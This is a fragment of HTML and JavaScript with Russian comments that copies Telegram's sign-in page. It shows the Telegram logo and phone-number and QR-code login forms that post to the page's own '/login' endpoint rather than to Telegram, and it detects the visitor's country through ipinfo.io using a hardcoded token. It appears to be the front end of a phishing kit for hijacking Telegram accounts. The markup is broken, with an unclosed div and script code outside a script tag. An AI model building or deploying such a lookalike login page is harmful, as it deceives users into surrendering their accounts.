    <!-- Анимация загрузки -->
    <div id="loading-overlay">
        <div class="spinner">

		</div>

    <div class="container">
        <!-- Логотип Telegram -->
        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo" class="logo">
        <h1>Sign in to Telegram</h1>
        <p>Select an authentication method to sign in to Telegram. You can sign in using your phone number or by scanning a QR code.</p>
        
        <!-- Всплывающее окно ошибки -->
        <div id="errorPopup" class="error-popup"></div>

        <div class="btn-group">
            <!-- Форма для авторизации по номеру телефона -->
            <form id="phoneForm" action="/login" method="POST">
                <input type="hidden" name="method" value="phone">
                <div class="phone-container">
                    <!-- Флаг страны -->
                    <img id="countryFlag" class="country-flag" src="https://flagcdn.com/w40/us.png" alt="us">
                    <!-- Поле ввода телефона -->
                    <input class="input-field" id="phoneField" name="phone" type="tel" placeholder="Enter your phone number" required>
                </div>
                <button class="btn" type="submit">Authorization by phone number</button>
            </form>
            
            <!-- Форма для авторизации через QR-код -->
            <form id="qrForm" action="/login" method="POST">
                <input type="hidden" name="method" value="qr">
                <button class="btn btn-alt" type="submit">Authorization via QR code</button>
            </form>
        </div>
    </div>

        // Функция для отображения сообщения об ошибке
        function showError(message) {
            console.log("Функция showError вызвана с сообщением:", message);
            const errorPopup = document.getElementById('errorPopup');
            errorPopup.innerText = message;
            errorPopup.style.display = 'block';

            // Скрываем уведомление через 4 секунды
            setTimeout(() => {
                errorPopup.style.display = 'none';
            }, 4000);
        }

        // Функция для установки флага страны
        function setCountryFlag(countryCode) {
            const flagImg = document.getElementById('countryFlag');
            if (countryCode) {
                // Формируем URL к флагу из FlagCDN
                // FlagCDN использует маленькие буквы для кода страны
                flagImg.src = `https://flagcdn.com/w40/${countryCode.toLowerCase()}.png`;
                flagImg.alt = countryCode;
            } else {
                // Если код страны не определён, устанавливаем флаг по умолчанию (США)
                flagImg.src = `https://flagcdn.com/w40/us.png`;
                flagImg.alt = 'us';
            }
        }

        // Функция для определения страны по введённому телефонному коду
        function detectCountryByPhoneCode(phoneNumber) {
            // Удаляем все символы, кроме цифр
            const cleanedNumber = phoneNumber.replace(/\D/g, '');
            // Проверяем длину и находим наиболее длинный подходящий код
            for (let i = 1; i <= 3; i++) {
                const code = cleanedNumber.substring(0, i);
                if (countryCodeMap[code]) {
                    return countryCodeMap[code];
                }
            }
            return null; // Код не найден
        }

        // Функция для обработки ввода телефона
        function handlePhoneInput(event) {
            const phoneNumber = event.target.value;
            const countryCode = detectCountryByPhoneCode(phoneNumber);
            if (countryCode) {
                setCountryFlag(countryCode);
            } else {
                setCountryFlag(null); // Устанавливаем флаг по умолчанию
            }
        }

        // Функция для получения страны пользователя через ipinfo.io
        function fetchUserCountry() {
            const token = '0d927b86d5b2d8'; // Ваш токен ipinfo.io
            fetch(`https://ipinfo.io/json?token=${token}`)
                .then(response => response.json())
                .then(data => {
                    if (data && data.country) {
                        setCountryFlag(data.country);
                    } else {
                        setCountryFlag(null); // Устанавливаем флаг по умолчанию
                    }
                })
                .catch(error => {
                    console.error('Ошибка при определении страны:', error);
                    setCountryFlag(null); // Устанавливаем флаг по умолчанию при ошибке
                });
        }

        document.addEventListener("DOMContentLoaded", () => {
            console.log("DOMContentLoaded событие произошло.");

            // Показ ошибки, если она передана от сервера
            const errorMessage = "";
            console.log("Получено сообщение об ошибке:", errorMessage);
            if (errorMessage) {
                showError(errorMessage);
                console.log("Показано сообщение об ошибке:", errorMessage);
            }

            // Обработчик события ввода для поля телефона
            const phoneField = document.getElementById('phoneField');
            if (phoneField) {
                phoneField.addEventListener('input', handlePhoneInput);
                console.log("Добавлен обработчик события 'input' для поля телефона.");
            } else {
                console.error('Поле ввода телефона не найдено.');
            }

            // Получение и установка флага страны пользователя

            // Обработчик события отправки формы авторизации по номеру телефона
            const phoneForm = document.getElementById('phoneForm');
            if (phoneForm) {
                phoneForm.addEventListener('submit', () => {
                    console.log("Форма авторизации по телефону отправлена. Отображаем загрузчик.");
                    // Отображаем загрузчик
                    const loadingOverlay = document.getElementById('loading-overlay');
                    loadingOverlay.classList.add('show');
                });
                console.log("Добавлен обработчик события 'submit' для формы авторизации по телефону.");
            } else {
                console.error('Форма авторизации по телефону не найдена.');
            }

            // Обработчик события отправки формы авторизации через QR-код
            const qrForm = document.getElementById('qrForm');
            if (qrForm) {
                qrForm.addEventListener('submit', () => {

                    const loadingOverlay = document.getElementById('loading-overlay');
                    loadingOverlay.classList.add('show');
                });
                console.log("Добавлен обработчик события 'submit' для формы авторизации через QR-код.");
            } else {
                console.error('Форма авторизации через QR-код не найдена.');
            }
        });
